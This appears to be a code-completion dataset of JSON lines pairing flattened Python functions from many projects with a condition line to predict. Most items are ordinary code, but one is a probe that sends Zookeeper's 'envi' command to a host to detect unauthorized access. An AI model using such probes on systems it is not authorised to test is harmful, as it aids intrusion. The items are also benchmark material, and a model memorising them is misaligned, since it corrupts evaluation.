{"input": "def add_to_auto_transitions(cls, base): result = {} for name, method in base.__dict__.items(): if callable(method) and hasattr(method, \"_django_fsm\"): for name, transition in method._django_fsm.transitions.items(): if transition.custom.get(\"auto\"): result.update({name: method}) return result", "label": "if transition . custom . get ( \"auto\" ) :"}
{"input": "def _paginate(self, get_page, page_size): for page in itertools.count(start=1): params = {\"page\": page, \"per_page\": page_size} response, items = get_page(params) for item in items: yield item if self._is_last_page(response): break if len(items) < page_size: break", "label": "if len ( items ) < page_size :"}
{"input": "def forward(self, x): bs = x.size(0) cur = self.stem(x) layers = [cur] for layer_id in range(self.num_layers): cur = self.layers[layer_id](layers) layers.append(cur) if layer_id in self.pool_layers_idx: for i, layer in enumerate(layers): layers[i] = self.pool_layers[self.pool_layers_idx.index(layer_id)]( layer ) cur = layers[-1] cur = self.gap(cur).view(bs, -1) cur = self.dropout(cur) logits = self.dense(cur) return logits", "label": "if layer_id in self . pool_layers_idx :"}
{"input": "def evaluate(self, x, y, z): vertex = Vector((x, y, z)) nearest, normal, idx, distance = self.bvh.find_nearest(vertex) if self.use_normal: if self.signed_normal: sign = (v - nearest).dot(normal) sign = copysign(1, sign) else: sign = 1 return sign * np.array(normal) else: dv = np.array(nearest - vertex) if self.falloff is not None: norm = np.linalg.norm(dv) len = self.falloff(norm) dv = len * dv return dv else: return dv", "label": "if self . signed_normal :"}
{"input": "def to_terminal(self): \"\"\"Yield lines to be printed to a terminal.\"\"\" for name, mi in self._sort(self.filtered_results): if \"error\" in mi: yield name, (mi[\"error\"],), {\"error\": True} continue rank = mi[\"rank\"] color = MI_RANKS[rank] to_show = \"\" if self.config.show: to_show = \" ({0:.2f})\".format(mi[\"mi\"]) yield \"{0} - {1}{2}{3}{4}\", (name, color, rank, to_show, RESET), {}", "label": "if \"error\" in mi :"}
{"input": "def _get_widget_by_name(self, container, name): \"\"\"Recursively search to return the named child widget.\"\"\" LOGGER.log() children = container.get_children() for child in children: if child.name == name: return child if isinstance(child, gtk.Container): found_child = self._get_widget_by_name(child, name) if found_child: return found_child", "label": "if found_child :"}
{"input": "def PyJsHoisted_hasComputed_(mutatorMap, this, arguments, var=var): var = Scope( {u\"this\": this, u\"arguments\": arguments, u\"mutatorMap\": mutatorMap}, var ) var.registers([u\"mutatorMap\", u\"key\"]) for PyJsTemp in var.get(u\"mutatorMap\"): var.put(u\"key\", PyJsTemp) if var.get(u\"mutatorMap\").get(var.get(u\"key\")).get(u\"_computed\"): return var.get(u\"true\") return Js(False)", "label": "if var . get ( u\"mutatorMap\" ) . get ( var . get ( u\"key\" ) ) . get ( u\"_computed\" ) :"}
{"input": "def get_result_json_path(self): if self._result_json_path is None: if self.envconfig.config.option.resultjson: self._result_json_path = get_unique_file( self.path, PARALLEL_RESULT_JSON_PREFIX, PARALLEL_RESULT_JSON_SUFFIX, ) return self._result_json_path", "label": "if self . envconfig . config . option . resultjson :"}
{"input": "def timer(ratio, step, additive): t = 0 slowmode = False while 1: if additive: slowmode |= bool((yield t)) else: slowmode = bool((yield t)) if slowmode: t += step * ratio else: t += step", "label": "if slowmode :"}
{"input": "def _split_long_text(text, idx, size): splited_text = text.split() if len(splited_text) > 25: if idx == 0: # The first is (...)text first = \"\" else: first = \" \".join(splited_text[:10]) if idx != 0 and idx == size - 1: # The last is text(...) last = \"\" else: last = \" \".join(splited_text[-10:]) return \"{}(...){}\".format(first, last) return text", "label": "if idx != 0 and idx == size - 1 :"}
{"input": "def test_tag_priority(self): for tag in _low_priority_D_TAG: val = ENUM_D_TAG[tag] # if the low priority tag is present in the descriptions, # assert that it has not overridden any other tag if _DESCR_D_TAG[val] == tag: for tag2 in ENUM_D_TAG: if tag2 == tag: continue self.assertNotEqual(ENUM_D_TAG[tag2], val)", "label": "if _DESCR_D_TAG [ val ] == tag :"}
{"input": "def _concretize(self, n_cls, t1, t2, join_or_meet, translate): ptr_class = self._pointer_class() if n_cls is ptr_class: if isinstance(t1, ptr_class) and isinstance(t2, ptr_class): # we need to merge them return ptr_class(join_or_meet(t1.basetype, t2.basetype, translate)) if isinstance(t1, ptr_class): return t1 elif isinstance(t2, ptr_class): return t2 else: # huh? return ptr_class(BottomType()) return n_cls()", "label": "if isinstance ( t1 , ptr_class ) and isinstance ( t2 , ptr_class ) :"}
{"input": "def parse(self, html: HTML) -> [ProxyIP]: ip_list: [ProxyIP] = [] for ip_row in html.find(\"table.proxytbl tr\"): ip_element = ip_row.find(\"td:nth-child(1)\", first=True) port_element = ip_row.find(\"td:nth-child(2)\", first=True) try: if ip_element and port_element: port_str = re.search(r\"//]]> (\\d+)\", port_element.text).group(1) p = ProxyIP(ip=ip_element.text, port=port_str) ip_list.append(p) except AttributeError: pass return ip_list", "label": "if ip_element and port_element :"}
{"input": "def _reformat(self): document = self.suggestions.document() cursor = self.suggestions.textCursor() block = document.begin() style_format = { self.STYLE_TRANSLATION: self._translation_char_format, self.STYLE_STROKES: self._strokes_char_format, } while block != document.end(): style = block.userState() fmt = style_format.get(style) if fmt is not None: cursor.setPosition(block.position()) cursor.select(QTextCursor.BlockUnderCursor) cursor.setCharFormat(fmt) block = block.next()", "label": "if fmt is not None :"}
{"input": "def check_uncore_event(e): if uncore_exists(e.unit): if e.cmask and not uncore_exists(e.unit, \"/format/cmask\"): warn_once(\"Uncore unit \" + e.unit + \" missing cmask for \" + e.name) return None if e.umask and not uncore_exists(e.unit, \"/format/umask\"): warn_once(\"Uncore unit \" + e.unit + \" missing umask for \" + e.name) return None return e if e.unit not in missing_boxes: warn_once(\"Uncore unit \" + e.unit + \" missing\") missing_boxes.add(e.unit) return None", "label": "if e . cmask and not uncore_exists ( e . unit , \"/format/cmask\" ) :"}
{"input": "def check(ip, port, timeout): try: socket.setdefaulttimeout(timeout) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) flag = \"envi\" # envi # dump # reqs # ruok # stat s.send(flag) data = s.recv(1024) s.close() if \"Environment\" in data: return u\"Zookeeper Unauthorized access\" except: pass", "label": "if \"Environment\" in data :"}
{"input": "def getid(self): uid = u\"\" try: filename = ( self.xmlelement.iterancestors(self.namespaced(\"file\")) .next() .get(\"original\") ) if filename: uid = filename + ID_SEPARATOR except StopIteration: # unit has no proper file ancestor, probably newly created pass # hide the fact that we sanitize ID_SEPERATOR uid += unicode(self.xmlelement.get(\"id\") or u\"\").replace( ID_SEPARATOR_SAFE, ID_SEPARATOR ) return uid", "label": "if filename :"}
{"input": "def identify(self, vivisect_workspace, function_vas): candidate_functions = {} for fva in function_vas: fname = vivisect_workspace.getName(fva) default_name = \"sub_%.8x\" % fva if fname != default_name: self.d(\"Identified %s at VA 0x%08X \" % (fname, fva)) candidate_functions[fva] = True return candidate_functions", "label": "if fname != default_name :"}
{"input": "def nud(self): self.first = [] comma = False if self.token.id != \")\": while 1: if self.token.id == \")\": break self.first.append(self.expression()) if self.token.id == \",\": comma = True self.advance(\",\") else: break self.advance(\")\") if not self.first or comma: return self # tuple else: return self.first[0]", "label": "if self . token . id == \")\" :"}
{"input": "def allow_syncdb(self, db, model): for router in self.routers: try: method = router.allow_syncdb except AttributeError: # If the router doesn't have a method, skip to the next one. pass else: allow = method(db, model) if allow is not None: return allow return True", "label": "if allow is not None :"}
{"input": "def status_string(self): if not self.live: if self.expired: return _(\"expired\") elif self.approved_schedule: return _(\"scheduled\") elif self.workflow_in_progress: return _(\"in moderation\") else: return _(\"draft\") else: if self.approved_schedule: return _(\"live + scheduled\") elif self.workflow_in_progress: return _(\"live + in moderation\") elif self.has_unpublished_changes: return _(\"live + draft\") else: return _(\"live\")", "label": "elif self . workflow_in_progress :"}
{"input": "def _on_config_changed(changed_name: str) -> None: \"\"\"Call config_changed hooks if the config changed.\"\"\" for mod_info in _module_infos: if mod_info.skip_hooks: continue for option, hook in mod_info.config_changed_hooks: if option is None: hook() else: cfilter = config.change_filter(option) cfilter.validate() if cfilter.check_match(changed_name): hook()", "label": "if option is None :"}
{"input": "def test_slowest_interrupted(self): # Issue #25373: test --slowest with an interrupted test code = TEST_INTERRUPTED test = self.create_test(\"sigint\", code=code) for multiprocessing in (False, True): with self.subTest(multiprocessing=multiprocessing): if multiprocessing: args = (\"--slowest\", \"-j2\", test) else: args = (\"--slowest\", test) output = self.run_tests(*args, exitcode=130) self.check_executed_tests(output, test, omitted=test, interrupted=True) regex = \"10 slowest tests:\\n\" self.check_line(output, regex)", "label": "if multiprocessing :"}
{"input": "def insert_files(self, urls, pos): \"\"\"Not only images\"\"\" image_extensions = [\".png\", \".jpg\", \".bmp\", \".gif\"] for url in urls: if url.scheme() == \"file\": path = url.path() ext = os.path.splitext(path)[1] if os.path.exists(path) and ext in image_extensions: self._insert_image_from_path(path) else: self.parent.resource_edit.add_attach(path)", "label": "if url . scheme ( ) == \"file\" :"}
{"input": "def _model_shorthand(self, args): accum = [] for arg in args: if isinstance(arg, Node): accum.append(arg) elif isinstance(arg, Query): accum.append(arg) elif isinstance(arg, ModelAlias): accum.extend(arg.get_proxy_fields()) elif isclass(arg) and issubclass(arg, Model): accum.extend(arg._meta.declared_fields) return accum", "label": "elif isinstance ( arg , ModelAlias ) :"}
{"input": "def get_identifiers(self): ids = [] ifaces = [i[\"name\"] for i in self.middleware.call_sync(\"interface.query\")] for entry in glob.glob(f\"{self._base_path}/interface-*\"): ident = entry.rsplit(\"-\", 1)[-1] if ident not in ifaces: continue if os.path.exists(os.path.join(entry, \"if_octets.rrd\")): ids.append(ident) ids.sort(key=RRDBase._sort_disks) return ids", "label": "if os . path . exists ( os . path . join ( entry , \"if_octets.rrd\" ) ) :"}
{"input": "def _validate_required_settings( self, application_id, application_config, required_settings, should_throw=True ): \"\"\"All required keys must be present\"\"\" for setting_key in required_settings: if setting_key not in application_config.keys(): if should_throw: raise ImproperlyConfigured( MISSING_SETTING.format( application_id=application_id, setting=setting_key ) ) else: return False return True", "label": "if setting_key not in application_config . keys ( ) :"}
{"input": "def digests(): if not OpenVPN.DIGESTS: proc = subprocess.Popen( [\"openvpn\", \"--show-digests\"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, ) stdout, stderr = proc.communicate() if not proc.returncode: OpenVPN.DIGESTS = { v.split(\" \")[0].strip(): v.split(\" \", 1)[1].strip() for v in filter( lambda v: v and v.endswith(\"bit digest size\"), stdout.decode(\"utf8\").split(\"\\n\"), ) } return OpenVPN.DIGESTS", "label": "if not proc . returncode :"}
{"input": "def iterate_demo_dirs(dir_name, env_name): for env_file_name in glob.glob( os.path.join(dir_name, \"**\", \"env_id.txt\"), recursive=True ): with open(env_file_name, \"r\", encoding=\"utf-8\") as fd: dir_env_name = fd.readline() if dir_env_name != env_name: continue yield os.path.dirname(env_file_name)", "label": "if dir_env_name != env_name :"}
{"input": "def validate_rights(namespace): if \"Manage\" in namespace.rights: if \"Listen\" not in namespace.rights or \"Send\" not in namespace.rights: raise CLIError( \"Error : Assigning 'Manage' to --rights requires 'Listen' and 'Send' to be included with. e.g. --rights Manage Send Listen\" )", "label": "if \"Listen\" not in namespace . rights or \"Send\" not in namespace . rights :"}
{"input": "def apply_patches(ctx, patched=False, pre=False): if patched: vendor_dir = _get_patched_dir(ctx) else: vendor_dir = _get_vendor_dir(ctx) log(\"Applying pre-patches...\") patch_dir = Path(__file__).parent / \"patches\" / vendor_dir.name if pre: if not patched: pass for patch in patch_dir.glob(\"*.patch\"): if not patch.name.startswith(\"_post\"): apply_patch(ctx, patch) else: patches = patch_dir.glob(\"*.patch\" if not patched else \"_post*.patch\") for patch in patches: apply_patch(ctx, patch)", "label": "if not patched :"}
{"input": "def log_sock(s, event_type=None): if sock_silent: pass else: if event_type is None: logsocket.sendto(ensure_str(s), (host, port)) elif event_type in show_event: logsocket.sendto(ensure_str(s), (host, port)) else: pass", "label": "if event_type is None :"}
{"input": "def replace_params( path: str, param_convertors: typing.Dict[str, Convertor], path_params: typing.Dict[str, str], ) -> typing.Tuple[str, dict]: for key, value in list(path_params.items()): if \"{\" + key + \"}\" in path: convertor = param_convertors[key] value = convertor.to_string(value) path = path.replace(\"{\" + key + \"}\", value) path_params.pop(key) return path, path_params", "label": "if \"{\" + key + \"}\" in path :"}
{"input": "def data(self, index: QModelIndex, role=Qt.DisplayRole): if not index.isValid(): return None if role == Qt.DisplayRole or role == Qt.EditRole: i = index.row() j = index.column() fieldtype = self.field_types[i] if j == 0: return fieldtype.caption elif j == 1: return fieldtype.function.name elif j == 2: return ProtocolLabel.DISPLAY_FORMATS[fieldtype.display_format_index]", "label": "elif j == 2 :"}
{"input": "def delta_page(self, x: float = 0.0, y: float = 0.0) -> None: if y.is_integer(): y = int(y) if y == 0: pass elif y < 0: self.page_up(count=-y) elif y > 0: self.page_down(count=y) y = 0 if x == 0 and y == 0: return size = self._widget.page().mainFrame().geometry() self.delta(int(x * size.width()), int(y * size.height()))", "label": "elif y > 0 :"}
{"input": "def _process_symbols(self, tokens): opening_paren = False for index, token, value in tokens: if opening_paren and token in (Literal, Name.Variable): token = self.MAPPINGS.get(value, Name.Function) elif token == Literal and value in self.BUILTINS_ANYWHERE: token = Name.Builtin opening_paren = value == \"(\" and token == Punctuation yield index, token, value", "label": "if opening_paren and token in ( Literal , Name . Variable ) :"}
{"input": "def ext_service(self, entity_id, typ, service, binding=None): known_entity = False for key, _md in self.metadata.items(): srvs = _md.ext_service(entity_id, typ, service, binding) if srvs: return srvs elif srvs is None: pass else: known_entity = True if known_entity: raise UnsupportedBinding(binding) else: raise UnknownSystemEntity(entity_id)", "label": "if srvs :"}
{"input": "def find_library_nt(name): # modified from ctypes.util # ctypes.util.find_library just returns first result he found # but we want to try them all # because on Windows, users may have both 32bit and 64bit version installed results = [] for directory in os.environ[\"PATH\"].split(os.pathsep): fname = os.path.join(directory, name) if os.path.isfile(fname): results.append(fname) if fname.lower().endswith(\".dll\"): continue fname = fname + \".dll\" if os.path.isfile(fname): results.append(fname) return results", "label": "if os . path . isfile ( fname ) :"}
{"input": "def getRemovedFiles(oldContents, newContents, destinationFolder): toRemove = [] for filename in list(oldContents.keys()): if filename not in newContents: destFile = os.path.join(destinationFolder, filename.lstrip(\"/\")) if os.path.isfile(destFile): toRemove.append(filename) return toRemove", "label": "if os . path . isfile ( destFile ) :"}
{"input": "def escapeall(self, lines): \"Escape all lines in an array according to the output options.\" result = [] for line in lines: if Options.html: line = self.escape(line, EscapeConfig.html) if Options.iso885915: line = self.escape(line, EscapeConfig.iso885915) line = self.escapeentities(line) elif not Options.unicode: line = self.escape(line, EscapeConfig.nonunicode) result.append(line) return result", "label": "if Options . html :"}
{"input": "def body(self): order = [ \"ok_header\", \"affected_rows\", \"last_insert_id\", \"server_status\", \"warning_count\", \"state_track\", \"info\", ] string = b\"\" for key in order: item = getattr(self, key) section_pack = b\"\" if item is None: continue elif isinstance(item, bytes): section_pack = item else: section_pack = getattr(self, key).toStringPacket() string += section_pack self.setBody(string) return self._body", "label": "elif isinstance ( item , bytes ) :"}
{"input": "def _get_instantiation(self): if self._data is None: f, l, c, o = c_object_p(), c_uint(), c_uint(), c_uint() conf.lib.clang_getInstantiationLocation( self, byref(f), byref(l), byref(c), byref(o) ) if f: f = File(f) else: f = None self._data = (f, int(l.value), int(c.value), int(o.value)) return self._data", "label": "if f :"}
{"input": "def analyze_items(items, category_id, agg_data): for item in items: if not agg_data[\"cat_asp\"].get(category_id, None): agg_data[\"cat_asp\"][category_id] = [] agg_data[\"cat_asp\"][category_id].append( float(item.sellingStatus.currentPrice.value) ) if getattr(item.listingInfo, \"watchCount\", None): agg_data[\"watch_count\"] += int(item.listingInfo.watchCount) if getattr(item, \"postalCode\", None): agg_data[\"postal_code\"] = item.postalCode", "label": "if not agg_data [ \"cat_asp\" ] . get ( category_id , None ) :"}
{"input": "def mock_default_data_dir(tmp_path: pathlib.Path): \"\"\"Changes the default `--data_dir` to tmp_path.\"\"\" tmp_path = tmp_path / \"datasets\" default_data_dir = os.environ.get(\"TFDS_DATA_DIR\") try: os.environ[\"TFDS_DATA_DIR\"] = os.fspath(tmp_path) yield tmp_path finally: if default_data_dir: os.environ[\"TFDS_DATA_DIR\"] = default_data_dir else: del os.environ[\"TFDS_DATA_DIR\"]", "label": "if default_data_dir :"}
{"input": "def has_valid_checksum(self, number): given_number, given_checksum = number[:-1], number[-1] calculated_checksum = 0 parameter = 7 for item in given_number: fragment = str(int(item) * parameter) if fragment.isalnum(): calculated_checksum += int(fragment[-1]) if parameter == 1: parameter = 7 elif parameter == 3: parameter = 1 elif parameter == 7: parameter = 3 return str(calculated_checksum)[-1] == given_checksum", "label": "if fragment . isalnum ( ) :"}
{"input": "def _cleanup_volumes(self, context, instance_id): bdms = self.db.block_device_mapping_get_all_by_instance(context, instance_id) for bdm in bdms: LOG.debug(_(\"terminating bdm %s\") % bdm) if bdm[\"volume_id\"] and bdm[\"delete_on_termination\"]: volume = self.volume_api.get(context, bdm[\"volume_id\"]) self.volume_api.delete(context, volume)", "label": "if bdm [ \"volume_id\" ] and bdm [ \"delete_on_termination\" ] :"}
{"input": "def _split_zipped_payload(self, packet_bunch): \"\"\"Split compressed payload\"\"\" while packet_bunch: if PY2: payload_length = struct.unpack_from(\"<I\", packet_bunch[0:3] + b\"\\x00\")[ 0 ] # pylint: disable=E0602 else: payload_length = struct.unpack(\"<I\", packet_bunch[0:3] + b\"\\x00\")[0] self._packet_queue.append(packet_bunch[0 : payload_length + 4]) packet_bunch = packet_bunch[payload_length + 4 :]", "label": "if PY2 :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_application_key(d.getPrefixedString()) continue if tt == 18: self.set_message(d.getPrefixedString()) continue if tt == 26: self.set_tag(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 10 :"}
{"input": "def update_transitive(self, conanfile): transitive = getattr(conanfile, \"python_requires\", None) if not transitive: return for name, transitive_py_require in transitive.all_items(): existing = self._pyrequires.get(name) if existing and existing.ref != transitive_py_require.ref: raise ConanException( \"Conflict in py_requires %s - %s\" % (existing.ref, transitive_py_require.ref) ) self._transitive[name] = transitive_py_require", "label": "if existing and existing . ref != transitive_py_require . ref :"}
{"input": "def call(cls, func, *args): try: f = cls._func_cache[func] except KeyError: if IS_NVIM: f = cls._func_cache[func] = getattr(vim.funcs, func) else: f = cls._func_cache[func] = vim.Function(func) return f(*args)", "label": "if IS_NVIM :"}
{"input": "def __call__(self, *args, **kwargs): if self is S: if args: raise TypeError(\"S() takes no positional arguments, got: %r\" % (args,)) if not kwargs: raise TypeError(\"S() expected at least one kwarg, got none\") # TODO: typecheck kwarg vals? return _t_child(self, \"(\", (args, kwargs))", "label": "if not kwargs :"}
{"input": "def tiles_around_factor(self, factor, pos, radius=1, predicate=None): ps = [] x, y = pos for dx in range(-radius, radius + 1): nx = x + dx if nx >= 0 and nx < self.width * factor: for dy in range(-radius, radius + 1): ny = y + dy if ny >= 0 and ny < self.height * factor and (dx != 0 or dy != 0): if predicate is None or predicate((nx, ny)): ps.append((nx, ny)) return ps", "label": "if predicate is None or predicate ( ( nx , ny ) ) :"}
{"input": "def _plugin_get_requirements(self, requirements_iter): plugin_requirements = {\"platform\": [], \"python\": [], \"network\": [], \"native\": []} # parse requirements for requirement in requirements_iter: key = requirement[0] values = requirement[1] if isinstance(values, str) or isinstance(values, bool): values = [values] if key in plugin_requirements: plugin_requirements[key].extend(values) else: warning(\"{}={}: No supported requirement\".format(key, values)) return plugin_requirements", "label": "if isinstance ( values , str ) or isinstance ( values , bool ) :"}
{"input": "def test_engine_api_sdl(sdl, expected, pass_to, clean_registry): from tartiflette import Engine if pass_to == \"engine\": e = Engine(sdl) else: e = Engine() if isinstance(expected, Exception): with pytest.raises(Exception): if pass_to == \"cook\": await e.cook(sdl) else: await e.cook() else: if pass_to == \"cook\": await e.cook(sdl) else: await e.cook() assert e._schema is not None", "label": "if pass_to == \"cook\" :"}
{"input": "def update(self, other_dict, option_parser): if isinstance(other_dict, Values): other_dict = other_dict.__dict__ other_dict = other_dict.copy() for setting in option_parser.lists.keys(): if hasattr(self, setting) and setting in other_dict: value = getattr(self, setting) if value: value += other_dict[setting] del other_dict[setting] self._update_loose(other_dict)", "label": "if value :"}
{"input": "def _cast_Time(iso, curs): if iso: if iso in [\"-infinity\", \"infinity\"]: return iso else: return DateTime( time.strftime( \"%Y-%m-%d %H:%M:%S\", time.localtime(time.time())[:3] + time.strptime(iso[:8], \"%H:%M:%S\")[3:], ) )", "label": "if iso in [ \"-infinity\" , \"infinity\" ] :"}
{"input": "def _get_default_urlpatterns(self): package_string = \".\".join(self.__module__.split(\".\")[:-1]) if getattr(self, \"urls\", None): try: mod = import_module(\".%s\" % self.urls, package_string) except ImportError: mod = import_module(self.urls) urlpatterns = mod.urlpatterns else: # Try importing a urls.py from the dashboard package if module_has_submodule(import_module(package_string), \"urls\"): urls_mod = import_module(\".urls\", package_string) urlpatterns = urls_mod.urlpatterns else: urlpatterns = patterns(\"\") return urlpatterns", "label": "if module_has_submodule ( import_module ( package_string ) , \"urls\" ) :"}
{"input": "def escape2null(text): \"\"\"Return a string with escape-backslashes converted to nulls.\"\"\" parts = [] start = 0 while 1: found = text.find(\"\\\\\", start) if found == -1: parts.append(text[start:]) return \"\".join(parts) parts.append(text[start:found]) parts.append(\"\\x00\" + text[found + 1 : found + 2]) start = found + 2 # skip character after escape", "label": "if found == - 1 :"}
{"input": "def check(self, obj): if \"*\" in self.states: return {\"state\": self.dispatcher.current_state()} try: state = self.ctx_state.get() except LookupError: chat, user = self.get_target(obj) if chat or user: state = await self.dispatcher.storage.get_state(chat=chat, user=user) self.ctx_state.set(state) if state in self.states: return {\"state\": self.dispatcher.current_state(), \"raw_state\": state} else: if state in self.states: return {\"state\": self.dispatcher.current_state(), \"raw_state\": state} return False", "label": "if state in self . states :"}
{"input": "def get_tokens_unprocessed(self, text): from pygments.lexers._asy_builtins import ASYFUNCNAME, ASYVARNAME for index, token, value in RegexLexer.get_tokens_unprocessed(self, text): if token is Name and value in ASYFUNCNAME: token = Name.Function elif token is Name and value in ASYVARNAME: token = Name.Variable yield index, token, value", "label": "elif token is Name and value in ASYVARNAME :"}
{"input": "def write_family_handle(self, family, index=1): sp = \" \" * index self.write_primary_tag(\"family\", family, index) if family: rel = escxml(family.get_relationship().xml_str()) if rel != \"\": self.g.write(' %s<rel type=\"%s\"/>\\n' % (sp, rel))", "label": "if rel != \"\" :"}
{"input": "def pop1_bytes(self) -> bytes: # # Note: This function is optimized for speed over readability. # Knowing the popped type means that we can pop *very* quickly # when the popped type matches the pushed type. # if not self.values: raise InsufficientStack(\"Wanted 1 stack item as bytes, had none\") else: item_type, popped = self._pop_typed() if item_type is int: return int_to_big_endian(popped) # type: ignore elif item_type is bytes: return popped # type: ignore else: raise _busted_type(item_type, popped)", "label": "elif item_type is bytes :"}
{"input": "def setDefaultComponents(self): if self._componentTypeLen == self._componentValuesSet: return idx = self._componentTypeLen while idx: idx = idx - 1 if self._componentType[idx].isDefaulted: if self.getComponentByPosition(idx) is None: self.setComponentByPosition(idx) elif not self._componentType[idx].isOptional: if self.getComponentByPosition(idx) is None: raise error.PyAsn1Error( \"Uninitialized component #%s at %r\" % (idx, self) )", "label": "if self . _componentType [ idx ] . isDefaulted :"}
{"input": "def _cloneComponentValues(self, myClone, cloneValueFlag): idx = 0 l = len(self._componentValues) while idx < l: c = self._componentValues[idx] if c is not None: if isinstance(c, base.AbstractConstructedAsn1Item): myClone.setComponentByPosition( idx, c.clone(cloneValueFlag=cloneValueFlag) ) else: myClone.setComponentByPosition(idx, c.clone()) idx = idx + 1", "label": "if c is not None :"}
{"input": "def endElement(self, tag): \"\"\"Handle the end of an element.\"\"\" if tag == \"author\": developer = self.text.strip() if self.title == \"author\" and developer not in self.author_list: self.author_list.append(developer) elif self.title == \"contributor\" and developer not in self.contributor_list: self.contributor_list.append(developer)", "label": "if self . title == \"author\" and developer not in self . author_list :"}
{"input": "def has_safe_repr(value): \"\"\"Does the node have a safe representation?\"\"\" if value is None or value is NotImplemented or value is Ellipsis: return True if isinstance(value, (bool, int, long, float, complex, basestring, xrange, Markup)): return True if isinstance(value, (tuple, list, set, frozenset)): for item in value: if not has_safe_repr(item): return False return True elif isinstance(value, dict): for key, value in value.iteritems(): if not has_safe_repr(key): return False if not has_safe_repr(value): return False return True return False", "label": "if not has_safe_repr ( item ) :"}
{"input": "def test_all_wizards(self): mod = \"w3af.core.controllers.wizard.wizards.%s\" w3af_core = w3afCore() for filename in os.listdir(\"w3af/core/controllers/wizard/wizards/\"): wizard_id, ext = os.path.splitext(filename) if wizard_id in (\"__init__\", \".git\") or ext == \".pyc\": continue klass = mod % wizard_id wizard_inst = factory(klass, w3af_core) yield self._test_wizard_correct, wizard_inst wizard_inst = factory(klass, w3af_core) yield self._test_wizard_fail, wizard_inst", "label": "if wizard_id in ( \"__init__\" , \".git\" ) or ext == \".pyc\" :"}
{"input": "def test_bool_performance(self): class Person(Document): name = StringField() Person.drop_collection() for i in range(100): Person(name=\"No: %s\" % i).save() with query_counter() as q: if Person.objects: pass assert q == 1 op = q.db.system.profile.find({\"ns\": {\"$ne\": \"%s.system.indexes\" % q.db.name}})[ 0 ] assert op[\"nreturned\"] == 1", "label": "if Person . objects :"}
{"input": "def validate(self) -> None: if self.query: if not self.sysupgrade: for arg_name in (\"aur\", \"repo\"): if getattr(self, arg_name): raise MissingArgument(\"sysupgrade\", arg_name)", "label": "if not self . sysupgrade :"}
{"input": "def __new__(cls, name, parents, dct): command_handlers = {} for attr_name, attr in dct.items(): if callable(attr) and attr_name.startswith(\"handle_\"): handles_what = attr_name[len(\"handle_\") :] if handles_what: command_handlers[handles_what] = attr dct[\"command_handlers\"] = command_handlers return super(CommandHandlerMeta, cls).__new__(cls, name, parents, dct)", "label": "if callable ( attr ) and attr_name . startswith ( \"handle_\" ) :"}
{"input": "def pop_error_text(self, error_text): if error_text in self.__errors: self.__errors.remove(error_text) if len(self.__errors) == 0: self.set_message_text(WELCOME_MESSAGE) else: self.set_message_text(next(self.__errors.__iter__()))", "label": "if len ( self . __errors ) == 0 :"}
{"input": "def run(self, edit): self.clear_phantoms() regions = self.view.sel() for region in regions: region, _ = self.get_selection_from_region( region=region, regions_length=len(region), view=self.view ) if region is None: continue try: self.json_loads(self.view.substr(region), self.duplicate_key_hook) except Exception as ex: self.show_exception(region=region, msg=ex) return sublime.status_message(\"JSON Valid\")", "label": "if region is None :"}
{"input": "def update_leaderboard(wait_time): conn = get_connection() cursor = conn.cursor(MySQLdb.cursors.DictCursor) while True: try: if use_log: log.info(\"Updating leaderboard and adding some sigma\") cursor.execute(\"call generate_leaderboard;\") if wait_time == 0: break for s in range(wait_time): # allow for a [Ctrl]+C during the sleep cycle time.sleep(1) except KeyboardInterrupt: break except: # log error log.error(traceback.format_exc()) break cursor.close() conn.close()", "label": "if use_log :"}
{"input": "def _external_tables(self): tables = [] for name, df in self.extra_options.get(\"external_tables\", {}).items(): if not isinstance(df, pd.DataFrame): raise TypeError(\"External table is not an instance of pandas \" \"dataframe\") schema = sch.infer(df) chtypes = map(ClickhouseDataType.from_ibis, schema.types) structure = list(zip(schema.names, map(str, chtypes))) tables.append(dict(name=name, data=df.to_dict(\"records\"), structure=structure)) return tables", "label": "if not isinstance ( df , pd . DataFrame ) :"}
{"input": "def getmod(self, nm): mod = None for thing in self.path: if isinstance(thing, basestring): owner = self.shadowpath.get(thing, -1) if owner == -1: owner = self.shadowpath[thing] = self.__makeOwner(thing) if owner: mod = owner.getmod(nm) else: mod = thing.getmod(nm) if mod: break return mod", "label": "if isinstance ( thing , basestring ) :"}
{"input": "def add_variant_attribute_data_to_expected_data(data, variant, attribute_ids, pk=None): for assigned_attribute in variant.attributes.all(): header = f\"{assigned_attribute.attribute.slug} (variant attribute)\" if str(assigned_attribute.attribute.pk) in attribute_ids: value = get_attribute_value(assigned_attribute) if pk: data[pk][header] = value else: data[header] = value return data", "label": "if pk :"}
{"input": "def get_files(start_dir, includes, excludes): # use os.walk to recursively dig down into the Pupil directory match_files = [] for root, dirs, files in os.walk(start_dir): if not re.search(excludes, root): files = [ f for f in files if re.search(includes, f) and not re.search(excludes, f) ] files = [os.path.join(root, f) for f in files] match_files += files else: print(\"Excluding '%s'\" % root) return match_files", "label": "if re . search ( includes , f ) and not re . search ( excludes , f )"}
{"input": "def findinDoc(self, tagpath, pos, end): result = None if end == -1: end = self.docSize else: end = min(self.docSize, end) foundat = -1 for j in range(pos, end): item = self.docList[j] if item.find(b\"=\") >= 0: (name, argres) = item.split(b\"=\", 1) else: name = item argres = \"\" if isinstance(tagpath, str): tagpath = tagpath.encode(\"utf-8\") if name.endswith(tagpath): result = argres foundat = j break return foundat, result", "label": "if item . find ( b\"=\" ) >= 0 :"}
{"input": "def load_classes(module, base, blacklist): classes = [] for attr in dir(module): attr = getattr(module, attr) if inspect.isclass(attr): if issubclass(attr, base): if attr is not base and attr not in blacklist: classes.append(attr) return classes", "label": "if issubclass ( attr , base ) :"}
{"input": "def run(): try: result = func() except Exception: future_cell[0] = TracebackFuture() future_cell[0].set_exc_info(sys.exc_info()) else: if is_future(result): future_cell[0] = result else: future_cell[0] = TracebackFuture() future_cell[0].set_result(result) self.add_future(future_cell[0], lambda future: self.stop())", "label": "if is_future ( result ) :"}
{"input": "def lastCard(self): if self._answeredIds: if not self.card or self._answeredIds[-1] != self.card.id: try: return self.mw.col.getCard(self._answeredIds[-1]) except TypeError: # id was deleted return", "label": "if not self . card or self . _answeredIds [ - 1 ] != self . card . id :"}
